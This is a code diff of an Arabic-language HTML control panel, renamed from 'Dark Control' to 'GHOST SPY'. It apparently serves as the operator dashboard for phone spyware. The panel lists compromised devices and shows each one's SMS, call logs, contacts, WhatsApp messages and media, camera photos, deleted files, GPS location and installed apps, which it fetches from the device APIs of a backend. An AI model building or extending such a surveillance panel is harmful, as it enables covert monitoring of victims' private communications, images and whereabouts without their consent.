@@ -1,490 +1,391 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Dark Control // Control Panel</title>
-<style>
-:root {
-    --bg: #030506;
-    --panel: #080d0f;
-    --green: #00ff88;
-    --blue: #00aaff;
-    --red: #ff174f;
-    --yellow: #ffeb3b;
-    --purple: #9c27b0;
-    --text: #e7f5f0;
-    --muted: #71847f;
-    --border: rgba(0,255,136,0.2);
-}
-* { box-sizing: border-box; margin: 0; padding: 0; }
-body { background: var(--bg); color: var(--text); font-family: "Segoe UI", Tahoma, sans-serif; min-height: 100vh; overflow-x: hidden; padding: 10px; }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>👻 GHOST SPY // Control Panel</title>
+    <style>
+    :root {
+        --bg: #030506;
+        --panel: #080d0f;
+        --green: #00ff88;
+        --blue: #00aaff;
+        --red: #ff174f;
+        --yellow: #ffeb3b;
+        --purple: #9c27b0;
+        --text: #e7f5f0;
+        --muted: #71847f;
+        --border: rgba(0,255,136,0.2);
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: "Segoe UI", Tahoma, sans-serif; min-height: 100vh; overflow-x: hidden; padding: 10px; }
 
-.container { max-width: 1400px; margin: 0 auto; display: flex; flex-direction: column; gap: 12px; }
+    .container { max-width: 1500px; margin: 0 auto; display: flex; flex-direction: column; gap: 12px; }
 
-/* الهيدر العلوي المطابق للصورة */
-header {
-    background: var(--panel);
-    border: 1px solid var(--green);
-    border-radius: 12px;
-    padding: 15px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 12px;
-    box-shadow: 0 0 20px rgba(0,255,136,0.25);
-}
+    /* الهيدر العلوي */
+    header {
+        background: var(--panel);
+        border: 1px solid var(--green);
+        border-radius: 12px;
+        padding: 15px 20px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        flex-wrap: wrap;
+        gap: 15px;
+        box-shadow: 0 0 20px rgba(0,255,136,0.2);
+    }
 
-.logo-box {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    border: 1px solid var(--green);
-    padding: 8px 20px;
-    border-radius: 10px;
-    box-shadow: 0 0 15px rgba(0,255,136,0.3);
-    background: #050a08;
-}
+    .brand {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        border: 1px solid var(--green);
+        padding: 6px 16px;
+        border-radius: 10px;
+        background: #050a08;
+        box-shadow: 0 0 10px rgba(0,255,136,0.25);
+    }
 
-.logo-box span {
-    font-family: "Courier New", monospace;
-    font-size: 20px;
-    font-weight: bold;
-    color: var(--green);
-    text-shadow: 0 0 10px var(--green);
-}
+    .brand-icon { font-size: 20px; }
+    
+    header h1 {
+        font-family: "Courier New", monospace;
+        font-size: 18px;
+        font-weight: bold;
+        color: var(--green);
+        text-shadow: 0 0 10px var(--green);
+    }
 
-.device-status-text {
-    color: var(--red);
-    font-size: 14px;
-    font-weight: bold;
-    text-shadow: 0 0 8px rgba(255,23,79,0.4);
-}
+    .device-name-display {
+        color: var(--yellow);
+        font-size: 14px;
+        font-weight: bold;
+    }
 
-.device-selector-box {
-    width: 100%;
-}
+    .device-selector {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
 
-.device-select {
-    width: 100%;
-    background: #050a08;
-    color: var(--yellow);
-    padding: 10px 15px;
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    font-size: 14px;
-    cursor: pointer;
-    outline: none;
-}
+    .device-selector select {
+        background: #050a08;
+        color: var(--yellow);
+        padding: 8px 12px;
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        font-size: 13px;
+        cursor: pointer;
+        outline: none;
+    }
 
-.top-action-buttons {
-    display: flex;
-    gap: 10px;
-    width: 100%;
-}
+    .delete-btn {
+        background: #1a0508;
+        color: var(--red);
+        border: 1px solid var(--red);
+        padding: 8px 12px;
+        border-radius: 8px;
+        cursor: pointer;
+        font-weight: bold;
+        font-size: 13px;
+    }
 
-.action-btn-red {
-    flex: 1;
-    background: #1a0508;
-    color: var(--red);
-    border: 1px solid var(--red);
-    padding: 8px;
-    border-radius: 8px;
-    cursor: pointer;
-    font-weight: bold;
-    text-align: center;
-    box-shadow: 0 0 10px rgba(255,23,79,0.2);
-}
+    .logout-btn {
+        background: rgba(255,23,79,0.1);
+        color: var(--red);
+        border: 1px solid rgba(255,23,79,0.3);
+        padding: 8px 14px;
+        border-radius: 8px;
+        cursor: pointer;
+        font-size: 13px;
+        font-weight: bold;
+    }
 
-.action-btn-gray {
-    flex: 1;
-    background: #0d1214;
-    color: #aaa;
-    border: 1px solid var(--border);
-    padding: 8px;
-    border-radius: 8px;
-    cursor: pointer;
-    font-weight: bold;
-    text-align: center;
-}
+    /* شريط الحالة */
+    .status-bar {
+        background: var(--panel);
+        border: 1px solid var(--border);
+        border-radius: 10px;
+        padding: 10px 20px;
+        display: flex;
+        justify-content: space-around;
+        gap: 15px;
+        font-size: 13px;
+    }
 
-.info-badges {
-    display: flex;
-    gap: 10px;
-    width: 100%;
-}
+    .status-item .label { color: var(--muted); margin-left: 5px; }
+    .status-item .value { color: var(--green); font-weight: bold; }
+    #networkStatus { color: var(--red); }
 
-.badge-box {
-    flex: 1;
-    background: #050a08;
-    border: 1px solid var(--border);
-    padding: 8px;
-    border-radius: 8px;
-    text-align: center;
-    font-size: 13px;
-    color: var(--green);
-}
+    /* تخطيط لوحة التحكم الرئيسية */
+    .dashboard-layout {
+        display: flex;
+        gap: 15px;
+        align-items: flex-start;
+    }
 
-/* التخطيط الرئيسي (المحتوى يسار، القائمة يمين) */
-.main-layout {
-    display: flex;
-    gap: 12px;
-    align-items: flex-start;
-}
+    @media (max-width: 900px) {
+        .dashboard-layout { flex-direction: column-reverse; }
+    }
 
-@media (max-width: 768px) {
-    .main-layout { flex-direction: column-reverse; }
-}
+    /* منطقة عرض المحتوى (يسار) */
+    .tab-content {
+        flex: 1;
+        background: var(--panel);
+        border: 1px solid var(--border);
+        border-radius: 12px;
+        padding: 20px;
+        min-height: 550px;
+        width: 100%;
+        box-shadow: inset 0 0 15px rgba(0,0,0,0.5);
+    }
 
-/* مربع عرض المحتويات (على اليسار) */
-.content-viewer {
-    flex: 1;
-    background: var(--panel);
-    border: 1px solid var(--red);
-    border-radius: 12px;
-    padding: 20px;
-    min-height: 550px;
-    box-shadow: inset 0 0 20px rgba(0,0,0,0.8), 0 0 15px rgba(255,23,79,0.15);
-    width: 100%;
-}
+    .tab-pane { display: none; }
+    .tab-pane.active { display: block; }
 
-/* القائمة الجانبية (على اليمين) */
-.sidebar-panel {
-    width: 280px;
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 12px;
-    padding: 12px;
-    display: flex;
-    flex-direction: column;
-    gap: 8px;
-    box-shadow: 0 0 15px rgba(0,255,136,0.15);
-}
+    .tab-pane h3 {
+        color: var(--yellow);
+        font-size: 16px;
+        margin-bottom: 15px;
+        border-bottom: 1px solid var(--border);
+        padding-bottom: 8px;
+    }
 
-@media (max-width: 768px) {
-    .sidebar-panel { width: 100%; }
-}
+    /* القائمة الجانبية (يمين) */
+    .sidebar {
+        width: 270px;
+        background: var(--panel);
+        border: 1px solid var(--border);
+        border-radius: 12px;
+        padding: 12px;
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+    }
 
-.menu-btn {
-    background: #050a08;
-    color: var(--text);
-    border: 1px solid var(--border);
-    padding: 12px 15px;
-    border-radius: 8px;
-    text-align: right;
-    cursor: pointer;
-    font-size: 14px;
-    transition: all 0.2s;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-}
+    @media (max-width: 900px) {
+        .sidebar { width: 100%; }
+    }
 
-.menu-btn:hover {
-    border-color: var(--green);
-    color: var(--green);
-}
+    .sidebar-title {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        color: var(--green);
+        font-size: 13px;
+        font-family: "Courier New", monospace;
+        margin-bottom: 5px;
+        font-weight: bold;
+    }
 
-.menu-btn.active {
-    background: #0a1f14;
-    border-color: var(--purple);
-    color: var(--green);
-    box-shadow: 0 0 12px rgba(156,39,176,0.4);
-    font-weight: bold;
-}
+    .sidebar-line {
+        flex: 1;
+        height: 1px;
+        background: var(--border);
+    }
 
-/* التبويبات والأقسام */
-.section-pane { display: none; }
-.section-pane.active { display: block; }
+    .tabs {
+        display: flex;
+        flex-direction: column;
+        gap: 6px;
+    }
 
-.section-title {
-    color: var(--green);
-    font-size: 16px;
-    margin-bottom: 15px;
-    border-bottom: 1px solid var(--border);
-    padding-bottom: 8px;
-    text-shadow: 0 0 8px rgba(0,255,136,0.3);
-}
+    .tab {
+        background: #050a08;
+        color: var(--text);
+        border: 1px solid var(--border);
+        padding: 10px 14px;
+        border-radius: 8px;
+        text-align: right;
+        cursor: pointer;
+        font-size: 13px;
+        transition: all 0.2s;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
 
-/* شبكة الصور */
-.grid-gallery {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-    gap: 12px;
-}
+    .tab:hover {
+        border-color: var(--green);
+        color: var(--green);
+    }
 
-.media-card {
-    background: #05070a;
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    padding: 6px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 6px;
-}
+    .tab.active {
+        background: #0a1f14;
+        border-color: var(--green);
+        color: var(--green);
+        font-weight: bold;
+        box-shadow: 0 0 10px rgba(0,255,136,0.15);
+    }
 
-.media-card img {
-    width: 100%;
-    height: 110px;
-    object-fit: cover;
-    border-radius: 6px;
-    background: #000;
-}
+    .count {
+        background: rgba(0,255,136,0.15);
+        color: var(--green);
+        padding: 2px 6px;
+        border-radius: 4px;
+        font-size: 11px;
+    }
 
-.media-card a {
-    background: var(--green);
-    color: #000;
-    text-decoration: none;
-    font-size: 11px;
-    font-weight: bold;
-    padding: 4px;
-    border-radius: 4px;
-    width: 100%;
-    text-align: center;
-}
+    /* الجداول والتصميمات الداخلية */
+    table { width: 100%; border-collapse: collapse; font-size: 13px; }
+    th, td { border-bottom: 1px solid var(--border); padding: 10px; text-align: right; }
+    th { background: #050a08; color: var(--yellow); }
+    tr:hover { background: rgba(255,255,255,0.02); }
 
-/* الجداول */
-table { width: 100%; border-collapse: collapse; font-size: 13px; }
-th, td { border-bottom: 1px solid var(--border); padding: 10px; text-align: right; }
-th { background: #050a08; color: var(--yellow); }
-tr:hover { background: rgba(255,255,255,0.02); }
-.no-data { color: var(--muted); text-align: center; padding: 30px; font-size: 14px; }
-</style>
+    .back-btn {
+        background: #050a08;
+        color: var(--green);
+        border: 1px solid var(--border);
+        padding: 5px 12px;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 12px;
+        margin-bottom: 12px;
+    }
+
+    /* شبكة الصور */
+    .images-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
+        gap: 10px;
+    }
+    </style>
 </head>
 <body>
-
-<div class="container">
-    <!-- الهيدر العلوي مطابق تماماً لصورتك -->
-    <header>
-        <div class="logo-box">
-            <span>👻 Dark Control</span>
-        </div>
-        <div id="deviceStatusText" class="device-status-text">لا يوجد جهاز محدد</div>
-        
-        <div class="device-selector-box">
-            <select id="deviceSelect" class="device-select" onchange="selectDevice(this.value)">
-                <option value="">اختر الجهاز...</option>
-            </select>
-        </div>
-
-        <div class="top-action-buttons">
-            <button class="action-btn-red" onclick="logout()">🚪 خروج</button>
-            <button class="action-btn-gray" onclick="location.reload()">🗑️ حذف</button>
-        </div>
-
-        <div class="info-badges">
-            <div class="badge-box">آخر اتصال: <span id="lastSeenDisplay">—</span></div>
-            <div class="badge-box">البطارية: <span id="batteryDisplay">—</span></div>
-            <div class="badge-box">الحالة: <span id="connectionState" style="color:var(--red)">غير متصل</span></div>
-        </div>
-    </header>
-
-    <div class="main-layout">
-        <!-- مربع عرض المحتويات (على اليسار) -->
-        <div class="content-viewer">
-            <!-- 1. معلومات الجهاز -->
-            <div id="pane-info" class="section-pane active">
-                <div class="section-title">معلومات الجهاز</div>
-                <div id="infoContent" style="color: var(--muted); padding: 15px;">اختر الجهاز لعرض تفاصيله التقنية...</div>
+    <div class="container">
+        <header>
+            <div class="brand">
+                <div class="brand-icon">👻</div>
+                <h1>GHOST SPY</h1>
             </div>
 
-            <!-- 2. الصور -->
-            <div id="pane-studio" class="section-pane">
-                <div class="section-title">صور الكاميرا DCIM والاستديو</div>
-                <div id="grid-studio" class="grid-gallery">
-                    <div class="no-data" style="grid-column: 1/-1;">لا توجد صور متاحة حالياً.</div>
+            <div id="deviceNameDisplay" class="device-name-display">لا يوجد جهاز محدد</div>
+
+            <div class="device-selector">
+                <select id="deviceSelect" onchange="selectDevice(this.value)">
+                    <option value="">اختر الجهاز...</option>
+                </select>
+                <button onclick="deleteDevice()" class="delete-btn">🗑️ حذف</button>
+                <button onclick="logout()" class="logout-btn">⏻ خروج</button>
+            </div>
+        </header>
+
+        <div class="status-bar">
+            <div class="status-item">
+                <span class="label">الحالة:</span>
+                <span id="networkStatus" class="value">غير متصل</span>
+            </div>
+            <div class="status-item">
+                <span class="label">البطارية:</span>
+                <span id="batteryStatus" class="value">—</span>
+            </div>
+            <div class="status-item">
+                <span class="label">آخر اتصال:</span>
+                <span id="lastSeen" class="value">—</span>
+            </div>
+        </div>
+
+        <main class="dashboard-layout">
+            <section class="tab-content">
+                <div id="callsTab" class="tab-pane active">
+                    <h3>📞 المكالمات</h3>
+                    <div id="callsListView"></div>
+                    <div id="callDetailView" style="display:none;">
+                        <button onclick="backToCallsList()" class="back-btn">⬅️ رجوع</button>
+                        <h4 id="callDetailTitle"></h4>
+                        <div id="callDetailsList"></div>
+                    </div>
                 </div>
-            </div>
 
-            <!-- 3. الرسائل -->
-            <div id="pane-messages" class="section-pane">
-                <div class="section-title">الرسائل القصيرة SMS</div>
-                <table id="table-messages">
-                    <thead><tr><th>المرسل / المستقبل</th><th>نص الرسالة</th></tr></thead>
-                    <tbody></tbody>
-                </table>
-            </div>
+                <div id="smsTab" class="tab-pane">
+                    <h3>💬 المحادثات</h3>
+                    <div id="conversationsList"></div>
+                    <div id="chatView" style="display:none;">
+                        <button onclick="backToConversations()" class="back-btn">⬅️ رجوع</button>
+                        <h4 id="chatTitle"></h4>
+                        <div id="messagesList" class="messages-list"></div>
+                    </div>
+                </div>
 
-            <!-- 4. جهات الاتصال -->
-            <div id="pane-contacts" class="section-pane">
-                <div class="section-title">جهات الاتصال المخزنة</div>
-                <table id="table-contacts">
-                    <thead><tr><th>الاسم</th><th>الرقم</th></tr></thead>
-                    <tbody></tbody>
-                </table>
-            </div>
+                <div id="contactsTab" class="tab-pane">
+                    <h3>👥 جهات الاتصال</h3>
+                    <div id="contactsListView"></div>
+                    <div id="contactDetailView" style="display:none;">
+                        <button onclick="backToContactsList()" class="back-btn">⬅️ رجوع</button>
+                        <div id="contactDetails"></div>
+                    </div>
+                </div>
 
-            <!-- 5. المكالمات -->
-            <div id="pane-calls" class="section-pane">
-                <div class="section-title">سجل المكالمات</div>
-                <table id="table-calls">
-                    <thead><tr><th>النوع / الحالة</th><th>التفاصيل / الرقم</th></tr></thead>
-                    <tbody></tbody>
-                </table>
-            </div>
+                <div id="locationTab" class="tab-pane">
+                    <h3>📍 الموقع</h3>
+                    <div id="locationDetails"></div>
+                </div>
 
-            <!-- 6. التطبيقات -->
-            <div id="pane-apps" class="section-pane">
-                <div class="section-title">التبيقات المثبتة</div>
-                <div id="appsContent" class="no-data">جاري تحميل التطبيقات...</div>
-            </div>
+                <div id="imagesTab" class="tab-pane">
+                    <h3>🖼️ الصور</h3>
+                    <div id="imagesGrid" class="images-grid"></div>
+                </div>
 
-            <!-- 7. واتساب -->
-            <div id="pane-whatsapp" class="section-pane">
-                <div class="section-title">وسائط وصور واتساب وواتساب أعمال</div>
-                <div id="grid-whatsapp" class="grid-gallery"></div>
-            </div>
+                <div id="deletedTab" class="tab-pane">
+                    <h3>🗑️ سلة المحذوفات</h3>
+                    <div id="deletedList"></div>
+                </div>
 
-            <!-- 8. المحذوفات -->
-            <div id="pane-deleted" class="section-pane">
-                <div class="section-title">الملفات والمحتويات المحذوفة</div>
-                <div id="deletedContent" class="no-data">لا توجد ملفات محذوفة.</div>
-            </div>
+                <div id="whatsappTab" class="tab-pane">
+                    <h3>💬 رسائل واتساب</h3>
+                    <div id="whatsappList"></div>
+                </div>
 
-            <!-- 9. الموقع -->
-            <div id="pane-location" class="section-pane">
-                <div class="section-title">الموقع الجغرافي (GPS)</div>
-                <div id="locationContent" class="no-data">جاري تحديث الموقع...</div>
-            </div>
-        </div>
+                <div id="appsTab" class="tab-pane">
+                    <h3>📱 التطبيقات</h3>
+                    <table id="appsTable">
+                        <thead>
+                            <tr><th>الاسم</th><th>الحزمة</th><th>نظام</th></tr>
+                        </thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
 
-        <!-- القائمة الجانبية (على اليمين) -->
-        <div class="sidebar-panel">
-            <button class="menu-btn active" onclick="switchTab('info', this)">
-                <span>معلومات الجهاز</span> 💻
-            </button>
-            <button class="menu-btn" onclick="switchTab('studio', this)">
-                <span>الصور</span> 🖼️
-            </button>
-            <button class="menu-btn" onclick="switchTab('messages', this)">
-                <span>الرسائل</span> 📩
-            </button>
-            <button class="menu-btn" onclick="switchTab('contacts', this)">
-                <span>جهات الاتصال</span> 📇
-            </button>
-            <button class="menu-btn" onclick="switchTab('calls', this)">
-                <span>المكالمات</span> 📞
-            </button>
-            <button class="menu-btn" onclick="switchTab('apps', this)">
-                <span>التطبيقات</span> 📱
-            </button>
-            <button class="menu-btn" onclick="switchTab('whatsapp', this)">
-                <span>واتساب</span> 💬
-            </button>
-            <button class="menu-btn" onclick="switchTab('deleted', this)">
-                <span>المحذوفات</span> 🗑️
-            </button>
-            <button class="menu-btn" onclick="switchTab('location', this)">
-                <span>الموقع</span> 📍
-            </button>
-        </div>
+                <div id="deviceTab" class="tab-pane">
+                    <h3>📊 الجهاز</h3>
+                    <div id="deviceInfo"></div>
+                </div>
+            </section>
+
+            <aside class="sidebar">
+                <div class="sidebar-title">
+                    <span class="sidebar-line"></span>
+                    <span>GHOST MENU</span>
+                    <span class="sidebar-line"></span>
+                </div>
+
+                <div class="tabs">
+                    <button class="tab active" onclick="switchTab('device')">🖥️ معلومات الجهاز</button>
+                    <button class="tab" onclick="switchTab('images')">🖼️ الصور <span id="imagesCount" class="count"></span></button>
+                    <button class="tab" onclick="switchTab('sms')">💬 الرسائل <span id="smsCount" class="count"></span></button>
+                    <button class="tab" onclick="switchTab('contacts')">👥 جهات الاتصال <span id="contactsCount" class="count"></span></button>
+                    <button class="tab" onclick="switchTab('calls')">📞 المكالمات <span id="callCount" class="count"></span></button>
+                    <button class="tab" onclick="switchTab('apps')">📱 التطبيقات <span id="appsCount" class="count"></span></button>
+                    <button class="tab" onclick="switchTab('whatsapp')">💬 واتساب <span id="whatsappCount" class="count"></span></button>
+                    <button class="tab" onclick="switchTab('deleted')">🗑️ المحذوفات <span id="deletedCount" class="count"></span></button>
+                    <button class="tab" onclick="switchTab('location')">📍 الموقع</button>
+                </div>
+            </aside>
+        </main>
     </div>
-</div>
 
-<script>
-let currentDevice = null;
-
-function logout() {
-    sessionStorage.removeItem('logged_in');
-    location.href = 'login.html';
-}
-
-async function loadDevices() {
-    try {
-        const res = await fetch("/api/devices");
-        const data = await res.json();
-        const select = document.getElementById("deviceSelect");
-        const prevVal = currentDevice;
-        select.innerHTML = '<option value="">اختر الجهاز...</option>';
-        if (data.devices) {
-            data.devices.forEach(d => {
-                const opt = document.createElement("option");
-                opt.value = d.id;
-                opt.textContent = `${d.model || d.id} (${d.status})`;
-                select.appendChild(opt);
-            });
-            if (prevVal) select.value = prevVal;
-        }
-    } catch(e) {}
-}
-
-function selectDevice(id) {
-    currentDevice = id;
-    const statusText = document.getElementById("deviceStatusText");
-    const connState = document.getElementById("connectionState");
-    
-    if (id) {
-        statusText.textContent = `📱 متصل بالجهاز: ${id}`;
-        statusText.style.color = "var(--green)";
-        connState.textContent = "متصل";
-        connState.style.color = "var(--green)";
-        fetchDeviceData(id);
-    } else {
-        statusText.textContent = "لا يوجد جهاز محدد";
-        statusText.style.color = "var(--red)";
-        connState.textContent = "غير متصل";
-        connState.style.color = "var(--red)";
+    <script src="script.js"></script>
+    <script>
+    document.addEventListener('DOMContentLoaded', function() { playSound(); });
+    function playSound() {
+        try {
+            const audio = new Audio('v.wav');
+            audio.volume = 1.0;
+            audio.play();
+        } catch (e) {}
     }
-}
-
-async function fetchDeviceData(id) {
-    try {
-        const res = await fetch(`/api/diagnostics/${id}`);
-        const data = await res.json();
-        const diag = data.diagnostics || {};
-
-        renderGallery("grid-studio", diag.media?.items || []);
-        renderGallery("grid-whatsapp", diag.whatsapp?.items || []);
-        renderTable("table-contacts", diag.contacts?.items || []);
-        renderTable("table-calls", diag.calls?.items || []);
-        renderTable("table-messages", diag.messages?.items || []);
-    } catch(e) {}
-}
-
-function renderGallery(elementId, items) {
-    const container = document.getElementById(elementId);
-    container.innerHTML = "";
-    if (!items || items.length === 0) {
-        container.innerHTML = '<div class="no-data" style="grid-column: 1/-1;">لا توجد عناصر متاحة حالياً.</div>';
-        return;
-    }
-    items.forEach(path => {
-        const div = document.createElement("div");
-        div.className = "media-card";
-        div.innerHTML = `
-            <img src="${path}" alt="صورة" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'100\' height=\'100\'><rect width=\'100%\' height=\'100%\' fill=\'%2305070a\'/><text x=\'50%\' y=\'50%\' fill=\'%23555\' font-size=\'11\' text-anchor=\'middle\' dominant-baseline=\'middle\'>ملف</text></svg>'">
-            <a href="${path}" target="_blank" download>تحميل</a>
-        `;
-        container.appendChild(div);
-    });
-}
-
-function renderTable(tableId, items) {
-    const tbody = document.querySelector(`#${tableId} tbody`);
-    tbody.innerHTML = "";
-    if (!items || items.length === 0) {
-        tbody.innerHTML = '<tr><td colspan="2" class="no-data">لا توجد بيانات متاحة.</td></tr>';
-        return;
-    }
-    items.forEach(item => {
-        const tr = document.createElement("tr");
-        const parts = item.split(":");
-        tr.innerHTML = `<td>${parts[0] || item}</td><td>${parts[1] || ''}</td>`;
-        tbody.appendChild(tr);
-    });
-}
-
-function switchTab(tabName, btnElement) {
-    document.querySelectorAll(".sidebar-panel .menu-btn").forEach(b => b.classList.remove("active"));
-    document.querySelectorAll(".section-pane").forEach(p => p.classList.remove("active"));
-    
-    if (btnElement) btnElement.classList.add("active");
-    document.getElementById("pane-" + tabName).classList.add("active");
-}
-
-loadDevices();
-setInterval(loadDevices, 15000);
-</script>
+    </script>
 </body>
 </html>
